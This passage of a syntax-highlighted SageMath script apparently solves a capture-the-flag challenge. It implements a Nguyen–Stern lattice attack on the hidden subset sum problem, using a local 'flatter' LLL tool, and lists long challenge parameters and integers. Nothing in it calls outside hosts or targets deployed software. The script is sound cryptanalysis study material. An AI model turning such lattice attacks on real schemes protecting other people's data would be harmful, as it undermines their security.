  <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;[%(levelname)s] %(message)s&quot;</span><br>)<br><br><span class="hljs-comment"># https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage</span><br><span class="hljs-comment"># faster LLL reduction to replace `M.LLL()` wiith `flatter(M)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flatter</span>(<span class="hljs-params">M, **kwds</span>):<br>    <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> check_output<br>    <span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> findall<br>    M = matrix(ZZ,M)<br>    <span class="hljs-comment"># compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH</span><br>    z = <span class="hljs-string">&#x27;[[&#x27;</span> + <span class="hljs-string">&#x27;]\n[&#x27;</span>.join(<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,row)) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> M) + <span class="hljs-string">&#x27;]]&#x27;</span><br>    ret = check_output([<span class="hljs-string">&quot;flatter&quot;</span>], <span class="hljs-built_in">input</span>=z.encode())<br>    <span class="hljs-keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,findall(<span class="hljs-string">b&#x27;-?\\d+&#x27;</span>, ret)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkMatrix</span>(<span class="hljs-params">M, wl=[-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span>):<br>    M = [<span class="hljs-built_in">list</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(M)]<br>    ml = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(flatten(M)))<br>    logging.debug(ml)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(ml) == <span class="hljs-built_in">sorted</span>(wl)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Nguyen_Stern</span>(<span class="hljs-params">h, m, n, M</span>):<br>    B = matrix(ZZ, m)<br>    B[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = M<br>    h0i = Integer(h[<span class="hljs-number">0</span>]).inverse_mod(M)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        B[i, <span class="hljs-number">0</span>] = - h[i] * h0i<br>        B[i, i] = <span class="hljs-number">1</span><br>    <span class="hljs-comment">#L = B.BKZ()    # slooooooow</span><br>    L = flatter(B)<br>    logging.info(<span class="hljs-string">&#x27;flatter done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    vh = vector(Zmod(M), h)</span><br><span class="hljs-string">    logging.debug([vector(Zmod(M), list(l)) * vh  for l in L])</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    Lxo = matrix(ZZ, L[:m-n])<br>    Lxc = Lxo.right_kernel(algorithm=<span class="hljs-string">&#x27;pari&#x27;</span>).matrix() <span class="hljs-comment"># faster</span><br>    logging.info(<span class="hljs-string">&#x27;right_kernel done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X])</span><br><span class="hljs-string">        rsc = Lxc.row_space()</span><br><span class="hljs-string">        logging.debug([xi in rsc for xi in Lx_real])</span><br><span class="hljs-string">    except:</span><br><span class="hljs-string">        pass</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    e = matrix(ZZ, [<span class="hljs-number">1</span>] * m)<br>    B = block_matrix([[-e], [<span class="hljs-number">2</span>*Lxc]])<br>    Lx = B.BKZ()<br>    logging.info(<span class="hljs-string">&#x27;BKZ done.&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> checkMatrix(Lx)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(Lx[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span><br><br>    Lx = Lx[<span class="hljs-number">1</span>:]<br>    E = matrix(ZZ, [[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.ncols())] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.nrows())])<br>    Lx = (Lx + E) / <span class="hljs-number">2</span><br><br>    Lx2 = []<br>    e = vector(ZZ, [<span class="hljs-number">1</span>] * m)<br>    rsc = Lxc.row_space()<br>    <span class="hljs-keyword">for</span> lx <span class="hljs-keyword">in</span> Lx:<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        lx = e - lx<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        logging.warning(<span class="hljs-string">&#x27;Something wrong?&#x27;</span>)<br>    Lx = matrix(Zmod(M), Lx2)<br><br>    vh = vector(Zmod(M), h)<br>    va = Lx.solve_left(vh)<br>    <span class="hljs-keyword">return</span> Lx, va<br><br>m = <span class="hljs-number">247</span><br>n = <span class="hljs-number">70</span><br>M = <span class="hljs-number">24727704801291912268835129736340977567569865784366882566681759917843647658060231409536848349518003784121914409876944135933654762801696486121844572452922377222301017649192408619831637530961997845860817966791811403512683444831050730277</span>  <span class="hljs-comment">#模数</span><br>h = (<span class="hljs-number">20469155492003601253253155553986803208931503654660710348720234166881649344003987262947017659012241047835048808070655285602897209239858740637878468266658899337230431317158339301884716019022543563824842749256770110913729930512649260804</span>, <span class="hljs-number">20061197539347089441548703718074268696982927733926399966893938885418017706383655096958576679109275153818455164325651467862757293092935593603331322600268652102317484783972009137643693799482954597365244794142123800753823881292602536480</span>, <span class="hljs-number">20449460766608148327819595887200586456206801278670684512632410913015490167503229582572274670752456522031099839096710051732743590814126659553219421423179332067697185796944680381658040503559588413035145948011713429631258754626251809510</span>, <span class="hljs-number">8694899395827009396141425992800033658778511870582271935710336140733986029271840480988700276909069199154936459475590420059851372448080387583101099303513327440738409895238607476203278712316251695883695113189088200686962847017765865251</span>, <span class="hljs-number">17498906738048927737996405866022970301450352038432120213930838838210038594926299429345553642022023354628862755091766856471553830387207275486875845428629363403317202957206875712023311105409026776222751170693634497194866213310044491948</span>, <span class="hljs-number">21299762658878585689792741107233334119508283391034542047533549461069861697448477916998731369486958411519583373650555867155855962437320409451328328158651213135213221691391305300586647640883613895924445303848945011091274872544725674414</span>, <span class="hljs-number">13858127090108368287746753156610976181884852029313352847097417269439999009242391680724254761571841185603751824488440165104153860614293879561204207753769517496283139692448618313378608851838592204671380865578837501521485226960295757131</span>, <span class="hljs-number">606107901015597672365982103377292862084693785965621044158858796689187941648736569096576321682310287031175045717941165527209428043020224184139162372752993919547870816012630061403517257290792929118011920477984972488980800309428929138</span>, <span class="hljs-number">16411347559169875469676322308290176281268630976465248631394286269278754960475346068565041099592979349979405282500383230219337689652572250821233598049978719348544790979587439571926076421698781802827344619141310395216702580071924399522</span>, <span class="hljs-number">6068129514673183503857587322729184998437772152551135658369680702133087671031996497962264049216246290631119377494262423727768860757742407967523061034172791840869912562774945606863954031992955819024967183759253919768822212999747782744</span>, <span class="hljs-number">16164073883659743891300469301841345466013040331496294498459841128458772221808605865298982279094019325297165362518613472961615756988375470180863560145427159107654477630571820179272488975849163426474631458599008988483395281798203200528</span>, <span class="hljs-number">6002652834833034433754084876025091748505356485760658745433173659340361267044983148952514860044218624345794714339893198968695437915359546317081144940354972707822464098838782671025813140852500245911841467802762732970205945777188441808</span>, <span class="hljs-number">17671459116121703756342696273829703490771262874572413082113674648287158047430332224637950989312667436860899021459708831070319841598164702019251450606454194564607879044661224315550514675652908609424461409598055757760711713272045049260</span>, <span class="hljs-number">9747804618981818225871997793952044666360767497788933437958387359050267555950930083105832397549316456989456304967283430526550121320745106610566272812291168897483422111931300711618308924263505765555678625775964949832562993340397250411</span>, <span class="hljs-number">21996324872073077242827998678880398901946388402016282475335311894567710762615152283467554531548297081386048827720410652120091647717684967177129064563480634873781425892452230881151261828547497099982851340353851101348946158575303726724</span>, <span class="hljs-number">20241128353291496652549108347619870477868850796680814076775175545760753973504668850036916374732720117160823389137853705825323283084380525440155558201212646427779126805749122859405488144164760267716232853839558997235342814050866837305</span>, <span class="hljs-number">13077656588899945700177181105263191868661064142860342679420184386239288545559858208951244435002966218243471420411045127025170552814160049125443370520964733258446212562129228879028530411822623695945498142516847896364762727423847457569</span>, <span class="hljs-number">7071530328065960890228453106008174199753371584339217118863740503556709237910489181283781927314970563878932442685277071347084354303239011911501455742585794028015220762730525765723336697380407902300153076264167533419216642860030224808</span>, <span class="hljs-number">22629252419865938253406009966521328587876533319128691562733593432194850726544929405088413178711982271889635298452313176698526192124305038839672198237812975135604141185210235559237447902236397265515318102940456244538398518752792480319</span>, <span class="hljs-number">5761459282176273118441944774799317407926062706007941700537400300748276958322349624237180755323800649847915919270480127859496807988229286598479624333300775674629423967322510405098758253061619727977005010935095672626407042895060271117</span>, <span class="hljs-number">13639378161376676791792650903794774452153629456935313476059754419699524574293526097694165098576687387486041665215960405733414879557245739928959501291435121608217008600392918108625339394853036499361173570509333162629246799468258136355</span>, <span class="hljs-number">1112221399019911081496513796105161716836267107501837651409516901292548472550496647130548616639784532217354650999157000279855022754714713097738729659495163953274484703014544784112610298442477231451271844048275322265529309125867188484</span>, <span class="hljs-number">12169161457053461668887038869671670176419946971662802953933166632081503259881448728851846332111194017082971192703865066066994163285010795828715477686499512514182295671281701232618183396077110570747529444745554508737426539555889099083</span>, <span class="hljs-number">11995511934849768905988062930456188671563166274831822681485210668895901448904842487096473591287554694509756168119490699415704136424403683840102743199694489304702405180406601329931714339410923612708808717358223085506757046662329629503</span>, <span class="hljs-number">13398528474737208001694948941230339341569100018647773619061861109738576104252100110443962069174319732180553417809151715735410100005179978063724591835291397314433312440421293983105825390167635459002960994550698739443052006993415149287</span>, <span class="hljs-number">21685721078976945602014626559051952462522937081933691461596237088189849657600841978193227429482306484131038624804443150311960061590035031144063153270840224125769186685588909207004132946200580900994078282900107456593588235003169921354</span>, <span class="hljs-number">21958932659990459795087732047584541007461325015275566949343681883128871386631056478783893068511478481080998508038344707524693059394150326940234855081823341566958854943322931261168562807321821084640569487228751077318094170704981650643</span>, <span class="hljs-number">18575326074968673858478938102428524301651676277226235867758079277741745360252102636120213638047957826270155136845469846718570511376252915803608625919614831191687134838436838444619000754054647327991321858217571418142823485948838843485</span>, <span class="hljs-number">21925408319719932198647415634718243407859189936679904356040860926584581042313625039619815019247876519120113207553707089727019778893587018690751305364116444902853587524322159019276550794203235986634843194549273092242442491313448819261</span>, <span class="hljs-number">21971769237171245388162249651275023141695912811218668240216220140957909617367793495291879198350993947099136765615466319867553659408044799043226321654345805093608432328775587162697826122051456089057951721736470156996789589476553105264</span>, <span class="hljs-number">11663665652950097951023874167071177053010440547278309973779798672676245675511213044752231769369800098096803991421401406373428185323198016967614776368177594490205473987491609921616943160817435319509156480489438442748695594208064506220</span>, <span class="hljs-number">8571733767532539591744305084238785438241372113715037973018068103542160069189369810177762541226540971969214853589594936813485292570840550755458909361226931687465304387382031888400449142008298116395068621612620111710861173184866936140</span>, <span class="hljs-number">7265641014493092305952899792692591083374900624337072072988050601814681241595404157641546803250164823540836286168102490427911208624069282838605171970733970339707601992725288390921333947799040016958678972693235850470014270495531454783</span>, <span class="hljs-number">18357683019971557309259589537387305852885630835264669230196131340413934504145103735168294472683744065174013315114812930463567210171038311927245433959034948205776155437226711665133074869096527958147737755278545942090787842643719386293</span>, <span class="hljs-number">11249630823936690987701184435328330983163223168635101989339377911187086984695870497253721111980469167097885275676200751043669504762094425614665999696903436973710297025883232331081137662411660725420763463582758176584701928482618894781</span>, <span class="hljs-number">21368417704130086095517329969849814675572842583190085389984103090985523417424304950647847490274582711171880575904265538743919551938416088883734546870704471113682032872096669715559005389583617506786922899538736534449123490145292870717</span>, <span class="hljs-number">14804820832711028510069420293910842363490984270818804823036282440726358025681287768311485300453811070788732988003156703771994750175077965636968452087698951366737342420716417627361539128824909909441296599842507450408639167847785653915</span>, <span class="hljs-number">10434593401661546638239269531721470859924069355256379358171970711096840647467279929406877589003350835919284031476862418858161422460097377292030151489346187334893502923880428533662123412400043690091517722265611541955158862687687083713</span>, <span class="hljs-number">24561443937015608720032402685089937637576551127866411331840220467266147984636152386876296689017192384827778734671122241130228223938051376943961096583907106197792850273311466092875658575488249813416281385686228639897799476137433072794</span>, <span class="hljs-number">18809508978562914770986641825424844673983326011247074637810890215219273029154108492496227431003955064765815763011903046546663244351135252376892253084070542641533081339319510865846592705413531461782231583683139065833462426977193323114</span>, <span class="hljs-number">1170325200926282785717575909542245218787696779459745550244912972650806869414330169502410895858680097983058617766512675739980564138645468322689195204967563486996177593733827238558844633804910336361508567070012845430162557209140318922</span>, <span class="hljs-number">9099530973344423583417798796448265698513331818761124724904157320649249490671748034442773080315290728734123593584766820587431677397350547048991745367397003023697063690573732401873466117208072387527262379544046633911232863713321651057</span>, <span class="hljs-number">6186545629812301877416853524734068114160450574994337117451587850263036761908385044092582990344042147406495912347645194115630652437606943173745789382845771049426443196019424697520894541338185145315971072044570777761063733877553713897</span>, <span class="hljs-number">18998733646999927412724741294417250892695086218116871981646202453146130670287277614970454171035798941213673467661889691048080971104465387696449499673490777958698659977825222598637449610957807490964624239691466685216040180063226979122</span>, <span class="hljs-number">2029035413823102082844939452656558074099805593476575872183225270283922006193130394920312821210960344438963206668816623318138806516660963226561860797911308864515985218753289984687939495010747187617345807068432674609822226022395002612</span>, <span class="hljs-number">1224334924830478941430540036421292246508644320238722677095883999889500298055876272715003687287887258419587507272093701524018402394087314059455381046013880303534485492492854314287356722191065404686438496257734600194353825409365914860</span>, <span class="hljs-number">15388830123476635874371535682309831543921413772062742670104698630978096538706065152811565310857194947646535508434358944071335015150277106407625487947363537743602712388716945337353159986787039117453435890006787376090096478885097896793</span>, <span class="hljs-number">10420053457335214342250034515332590797688043330675602278978659239127226996657084329075623919952172290482707420754415548245461942799120532008714972162634055331774926378534698291836555381029033314988303673575302329970048819875247229179</span>, <span class="hljs-number">12996570101872386881673806472032213506289839322758639432467242407197962401207255061640708238859358713382396645910306730272104173292864961862992132326434563495453537396958298185516874532647829493332700756725404634790257544413340701179</span>, <span class="hljs-number">11310001007421937130740204981515298136120181111962805563938085404289034278582061516301247258497064123414338657565189590291572623864937738084898059354622789358315367559028252287238789841719507080364615405563645390035528060316587102434</span>, <span class="hljs-number">7649920628929819175111413039486903286582015040923724934131761955991728816695088157076979052445031028120246103984026955901706105551535103282597498033031299709784514740469952209886314525277234547727841567842751063166501691717457807447</span>, <span class="hljs-number">8282767661876353703033480225670583969116738681062155629579190289397580081693316541581172493468366688140769336848827009811751348916039495262878858557738835369246631011150499694799485418164185557834866797870483707948444235231858169626</span>, <span class="hljs-number">10348065215991838887653401510489462098163485305574734545999066167894062235647455464256295931687781439097474305106334560598277885818537337701043155862614830925253569580192693898982318220593792046251125806231585329780902132617095557605</span>, <span class="hljs-number">11280967838102140047754377333560306350439648795137561969675963243081381329614099288939779782707558436465906221877404058208128414128559781592656246480955369758626788333375306898903783463959673000218175927160948442088191543414186131128</span>, <span class="hljs-number">11818929318729599124873943942145086021537273013997542692590943191077407938431043519607803418206555258214868688916182982805626078211252859082557253484889098137542929253460999852448424761935728458750150144937944771790308225982842690991</span>, <span class="hljs-number">5412969967721429139669566091956620099392941108847901064147423662180279827506836216754081912452764251675143575201910182189452840950356093575193249038624088662404268095962548749560674786705087512264668188729966989099888520624252744742</span>, <span class="hljs-number">17547356830409485892450749625199098509352498837601257846778404113094407637374346871392480581359187302653977880177675827091282945951962337410850311708191191160617963235512211658386260536823783677847875240999663432436509923589359888700</span>, <span class="hljs-number">8591887831833320840353196012263813111833998698446912587048628554388758958894496922493509033622609997670078612331200032453354380661501616871254995529921741954557910165239506265116743029658460390005477758921580324576966499950007047698</span>, <span class="hljs-number">24240608152025765890027400489331384103622640389639440068870645610439083379801706312111003846522258870692561041435455283169383633954853734692273153399247032151636823004018903792154640252253321042038217671452847628056591095001306376447</span>, <span class="hljs-number">18175238845322126323124732491839020080710712641999842067614816417084136046584647549081884372712146959940542383332663098640914320062272677772398521802893135140152503676658094543636706418059620569628737841646560680792630698212823857262</span>, <span class="hljs-number">10173862342693636575822816691492648273969020863129335004286001570695771568655492268044889845820019987659485915423299727906247618142386037838017456563194751538355466980296232841821674366111391576715244751705262011350337874749069345128</span>, <span class="hljs-number">17662887672308755659019635470333733858782416229711314422114693688837435216071004353298349767965595195988075045297248229654838457705997370106886962462023530886801849382037053188597909092732733084276903712706650614116210171460124448702</span>, <span class="hljs-number">12181524874770358579756085310138062154649043402053826988100381472344586613507823529632552464702544146652926312223695774383330894873770697330113566788363326971512196767946895811541430690548268356821209678371607727953997755838859126774</span>, <span class="hljs-number">11706994803516619040652442122624584733481017689525911051638928911326046116787740449573218360698003304996969933288041344857060888292758795645873721224079904632765180343552430630220956988207594755397804226083803193344994676329154327493</span>, <span class="hljs-number">8402357024978800071132055381314495648044905341576271257490683211086187354513127161690622199664304716824213610566304398546880266690789434430387528988209454626947248456097541304971867186772981230342257502227623573405137627210448823142</span>, <span class="hljs-number">13448814958668457684435846084935312650492724089658173841576258956348433114343610821298085173624638488238498589587758466360130338576374710075452327343150526934585873779496035836251602780112344762888078216555506331950896199565104006397</span>, <span class="hljs-number">23261851067858529243006512692328544765212250343687275283881011048369283487674444025254618141024372715313068675809489228084809200986696814193106301463035744067133170413056991023684452021013779169832348352784939483901536220423645197942</span>, <span class="hljs-number">2956461782787803412373184373521537264070982785668285831540757975387873992581341347760818916518443181764106275140479051787993901624417517942973131286068209774333764601237951091135348213764981692825938722977028088836454760352308033758</span>, <span class="hljs-number">3064486829635307133829604105999736772476219409968765985793477839736080127528728977191920114031725863884495929381858399046617507423360505816138935964152136380493092256651231150405966672895186096713142246153609317333657783049782151637</span>, <span class="hljs-number">10534802040612029540164483914330039254596233735171946359486562702340646071277688198935825397890574505178778613602867388545647349934716384895425051636497444634355043931879515977147131722039200347425808771386164417873392627039032929381</span>, <span class="hljs-number">16347587561440747118213871772022312563284652196262767324725458541109438659123670691624550736479719729504505614345452675461481177780240509736905011159885741573570625495043362505744257188005059869496076647939661464052864550390489436392</span>, <span class="hljs-number">932904564223742245423974397013211219322210230063409757135997988238048200833511900713764471854227396545059725844299953686973316362284758928784205613692959818986324717887966604059912158445010080457313116226499514698345116888739045201</span>, <span class="hljs-number">14155784829547910297069256239291885565427894076067719732956480982423435038774293432631990332881685973262975579857568134342058023430988483873438365184934853154265957089486695576174902453654823300612278786604052983027801579290159697757</span>, <span class="hljs-number">15059083507189045339756950559733288471657088114328896031836676598008347915133424684726963231247503783837186267424615012969099328203791879946151584653751983269080942728473598803375881811206929641186341006775658793858164370672638305414</span>, <span class="hljs-number">24050946955204789955533896427147712239350820947048633709193663894730552442910167865457955759634279229427681904250200157386924869101980949385253708656818328215342828689475987104598173819168455976517935776911361022122188385844429827861</span>, <span class="hljs-number">19717014416567816150124583987528154859466839421475505938275277134544233978125970101441724416647563320808697850421129369459770642837401448140038995613160278102100098417142249160683605942010321574730955450415122680160957836958254976336</span>, <span class="hljs-number">18341739025196342781439155614541180114644324261593971049987391428771657889467166499305558227635786922038300709465635665032362788821657236521443750938108440264564014080412870675324633423190226880338075753190002816740212167912541667386</span>, <span class="hljs-number">1813015948270605170494327027462767927668238016932441018204770850364166891479780348149629127108953561818359981896571545563617551207948156571122643027237671390832571624849892766565662348404168867487258425853064191070395435566239448528</span>, <span class="hljs-number">1703147790278812545808919311803253465091977239190220478003554114391300310923920435402284572213975190078137810042295522772486405957891397177306562281878529791622615529533777964508592563167873221257377134938914666430743351377618599468</span>, <span class="hljs-number">6278178489775796378230960195168194198865191514369599946855978876059738107235833955372780564515702681152913705996119810470327292606622329414011316101619726547400486206707034436148811872252943718668515788898176009551715308155411378252</span>, <span class="hljs-number">18502372570762310433863217616808095626038090932776074429027848581566215187912012261455455254801851855136832053610149165093284302575637475929697357817164914767314039550045344473538968895886764268535726243745335200504802864455745224374</span>, <span class="hljs-number">4619546424150636720632675449805339943017962539019526400964585316199619112511814181720051470848623690283063163236111719759442441616569278847685187351643033457613638640496754781862046330458169376039112280170067629393555816168818241121</span>, <span class="hljs-number">17415120259263326575917785021419190975482450501413944929888356972186654579803176474572508975215766509194009235591715149336564009819560581298723878336153312453947335918616023490225580430289839613029201222545734451097726880722839921382</span>, <span class="hljs-number">8307522287111865592770453226202115257484524653842503182672038744879218056275899543441543776625702705787596409072729458316533724848741039140250187914824007142564158445077159333307590448478263879269330063036285504424990516198257896295</span>, <span class="hljs-number">11263353891678243397276227460314841929873607735065191631233072436184881556807080115175345410349873166932751571268937511388565445447370133162623474541842794012489039636114698489895111355542309742024144040488016432324050920900295291917</span>, <span class="hljs-number">22637221521096771355782848874319356640240782235023169163186886225331051134680206995051142472351972293320891064080813070515162355530485444273200297804821736770540507890630957957945276656133277989360715398965382403686702660132053087389</span>, <span class="hljs-number">17919419877135534987371117199483506832865643179065513875403972803516315262685396424216812524399278928565319596834323499540921207386454692592496134156868095555234425205678332118842419128184729949597616863672987401083957030450961088118</span>, <span class="hljs-number">6084785464319055531520936804008603920136226720135667541062857654162604072088374635967414294340045316322725709290667559576429084868775969096858901672894136646463280390764523549103315360820057333674907169174163429153014379285872747201</span>, <span class="hljs-number">22582646848247815349822384029625982294969862652773702071458460690402019599859783915087863321522598200340080081814722953057928887642522789124256212970552071481336495429114943130059072461748175646464632989698260874422879732797887630047</span>, <span class="hljs-number">18669626144014838256754393744104130472295922668789204770557829273317529078229484347843108989561950816009995418160306613843824685195742442008837587483298470746325730371307237685260665649724430226456422634290254179870262594544431983580</span>, <span class="hljs-number">20052406002140826214070462061355742833483311314204273816436922246583813045591993339752776465796599006048131075796594497697843310687048655947142956234427753793119501583467069339507721514048187534341243065632056453879312603380628033984</span>, <span class="hljs-number">8536998978578217458444546841067601712321613656238053987413723752276637535354443999372125303631295704610057669756260574243930397078353340155663182523975349073323122272823468525187727995554596366377566035875710779754713058741421952297</span>, <span class="hljs-number">18434625855226899883321256831367130395454266215612264702708075963791303925781592538547918831568109391525493791354981671339894441519904308962763998161987029013446729670718008148129133450351098070931554566261249895846253603636590459596</span>, <span class="hljs-number">4836589882106604573232223783562904282390113141134832184116904820708055678518566213625282539739120591243833386887356618441208163640057659125158988736716688790394207262106963544742980383712576206460105345350538386057072108474044619762</span>, <span class="hljs-number">6151404576887692192610418168194331069192875548920158964829022752513950390283339567156423340910687221576158002429133456052555654098031826362939557645155801837456631388169151822830860248697122438884510698830753889483429000372055663270</span>, <span class="hljs-number">1574957139018125716198556939124476979519175929549560352017864438659995599753619766161008956285299169458623403378359963178580562501544136272165783563207087197050431991062774440640781210997705052555763881548707362577843167934254303211</span>, <span class="hljs-number">17391739152895538066781672275956234672907920242794599378833168697429044919890739257714041398214783661258560907470027798397029764878415624758336877129671514678297353821687758143698229059859378874838953846176893688321578130610211565286</span>, <span class="hljs-number">22442775423196539068158317596467259088950472981582207880432855826287481502251341833382328178251544577017724250630849093658390304250535679234308101654761044939170582837625840089519904382455956192527790359472609400260135910142621984804</span>, <span class="hljs-number">7748145694686025228235215160750244287356340902395751036047680266668756996397350960420787060972587276915359606276766739777861347852878339037039524614848022448512348644599427802285464351651684733130472167279398416173868476456640343912</span>, <span class="hljs-number">968331055615348886946161174142596323259279195401290249125471421855394873300085582575869103540417932149745449924520552363175883831558583706411049245922455751591766401028527194162506783887475373042174297269540922518114299818971515732</span>, <span class="hljs-number">4074196420936964179766581964556249617600508808814880297307983370447540931003863746901029660929911106973066021649873857071560682302121391895434719968587180495592648327726491322805723227506930292583988197314499826859508435423130136511</span>, <span class="hljs-number">19864987974362234107843653929873500108136815262278445784737257026822472090684137983310497635654575899271214537322575710548691021536061053470964176925313591634748257211956578723604063519794172805717329303553656399286725199286782179098</span>, <span class="hljs-number">5980232223078727426630626502373985853071880541561981005218776841139298756434767290311430618487388592202253565417179231192022611316234657898418924157525655172678865435399101556073022390243434214511995519696285633065317753437363140899</span>, <span class="hljs-number">9821319966095560427870562540391515794742864976782463778999916398549075070208007164914970520077561657764076828409003343933376170855999484408246466687946900127907046008389427535470321658506118424459143900724118409798821454695603532413</span>, <span class="hljs-number">7827061760058169599128916445957168975571796630781465189931078722702870872684431267074675693818964100116677523139537724577680225755195092012197924786849023733994256374790421775024816070942174050947871976107979562435932865310494883087</span>, <span class="hljs-number">22444668052197480392921780325089923182285523366742407483346175183018618880471398182443968590402259809874065978185849126448188342895030137619253767196685974598148578223227750661256523638369688545340957145235941267699205041015976512893</span>, <span class="hljs-number">20917044400441994043876270524213483352610260969649420453302372823720482527762724079002988257467288936795890599751896104615953448223734081092408051311403775183351145101060024221646952031995834916254264079757831184110975778281092887507</span>, <span class="hljs-number">23140912538412009642128425132684342938279634667238702284276382497865489723993571612771587585503991716334178974558961918251076413896005571217843917697675846778156724083976226196922651714668362270739315887073416139790810854613161221205</span>, <span class="hljs-number">22777946012556717221075832833653666836629416861635512682775171879258070731828427066106777275170219181994163961386136705459389933201518366302644543778363562846466085257052188326159339853787923581481741947880793477699405480147382158494</span>, <span class="hljs-number">23851586262216165721855485651763540041901511489076454491269387584732596518981375859161694969885462872348599346737087824666606523489542019629415264018415534655453799899565276989370343113997814318338527314054146555972083061531585827540</span>, <span class="hljs-number">20241416376929699761750802558413112170873703541929048761197148717657034619071841172624649616126693643941848760178381682942801111935776714336673825991096083096572342885484491597788757271226301779632972642169838769965985177058217188038</span>, <span class="hljs-number">2692623658541928573101809574838111935515631623595566809258680332737841700723177581136913483180407761165968252907913185839978546543265283140651614694449288264776969017249235506292038168449124679820126351493857549856356121231151653092</span>, <span class="hljs-number">16131290371505918809335910442479495479841565683249366748358361988494535045927568460325417586137766570965946466933319709361295018081273755953428838543656376509391831612977590017091825515705947022941510609863748269022738241991112543488</span>, <span class="hljs-number">1335160611734517210645206538933135972937544803451806751759630093284405592061360484816228430621641176590985805245868699739008511603795763736239195005005100364118036164638319077433065549088587459341808702399982456843190373618829758380</span>, <span class="hljs-number">10340884655343139837671785768186602936214734136755477567866586190929922502684799328216935326848576904458087728141043911084892486564116287640011646899861462113035901153299622043759499282128564846901160241967532876328459689814413762415</span>, <span class="hljs-number">5401801998031885667933094843069088272827013350970253067554899772704793572618267277623489486460813952487852750203234532174602055095351744072948091510037938518921258719623872400909307218937680691436513657947420608446304518643433543806</span>, <span class="hljs-number">22418868106953255259925166180079659279224737549892921884878026172626266645583784111270814808165875702359326672598830454977959663875880390431168563609899967914132355212711052456153248630704103482626553682618348908416775395116183421160</span>, <span class="hljs-number">20136816925897836048772212824296976042694611960736454057157846271343943360453902970773845024303002259554524096897822838253842365660027362116226399377625905232718459877264554224090369414896236479377060541879764953830249057877045251555</span>, <span class="hljs-number">417007008641601538653131077937620123593549306092323725176317590989242946892864900660489655668904173115128836432434611768470228830641521176358301458746585411902484062496874795344596497020100855878780454061487570562235412769427686317</span>, <span class="hljs-number">9816475565441529661291824775139176002345288049562161459635217819610547571837959753097093100495711176071908644218955109371081139417135838663380195844736613456931438981238662973400611171398897919439637129498647633743885607728861261845</span>, <span class="hljs-number">23870935413324621348274921404095042947875585668987906695837586539050798799854533446390296432839375770804268047327372595660396408173256820274722381200344879062334763587710033759647191441214875827380395128531108963710853637847394865713</span>, <span class="hljs-number">5298283449173550237355629570588050847341460771573182634769894887770904533264599629995486512196147997419360308122234130045379554651637311836030578449665827917483073270459896882565258770161952823438641471340977976030370479284643371508</span>, <span class="hljs-number">9100837458325934090298687047369486564792435663532832334039514867133941164867094239825017906066058129874353079407264039259148505190526558442923936093553694722216375206807028548669491820363396636679859686397489340148773407722045937270</span>, <span class="hljs-number">17038367322359956199612085432647045245163774933791813550948476894306406589837225702818847799733173871855718021202472793156228757158103629792922793811988464842161571581127798138726439413898369919443095650665934234847679938496501082548</span>, <span class="hljs-number">5299931840319151047971338206132253854280031927943516805614636255095356530922613677536304699331683053630885588152231978881663325811744339303687716269251042135117691288866254176400980454233864302175455006617533230769750479680704003803</span>, <span class="hljs-number">12540635716642138050069818430585456163343167481815665545278957523114902416154894156857128176013092728156227339170914675236740354318471661079175938598595792244472546173729361758589747726406890065450274035377585868728685758016648252277</span>, <span class="hljs-number">20322491326674638034817966107240137846880079505122662915547658066684133128524680689280031204806726531719600178717407242432128474388718978132706799940782382379254141734042970031880774214699826014425312091260412469194792303194943312541</span>, <span class="hljs-number">5229662284467342488041460575057606427352459717204043541086271154843521129291284032127069339383360917307751194492229261239447923171449428855700540788480851171076934541793501678873893328468428087126295294243102629336566344072435148926</span>, <span class="hljs-number">3285838812530358897545298545597343176030011766358309208184051849657687130054651377685203521819371289947496722092598297091948769435961363706612789578094785479539087879764936323884232849776769800582357588276204554212787884397356609075</span>, <span class="hljs-number">985977908000415897087132935158491952560421294051636567544225622494066414580751745182595887079757589173529845207284035227594010385666914234516531594517789212163680139291972549513242975229837531367529730153966350998393964527190960780</span>, <span class="hljs-number">17065146968215067842383191941447787644924233733406612558491157934810641836558863455012704342178343064915019207439623922379811619035308569771475626867167513169039770149329185353910699976605853826239989744767067695675074282642081109122</span>, <span 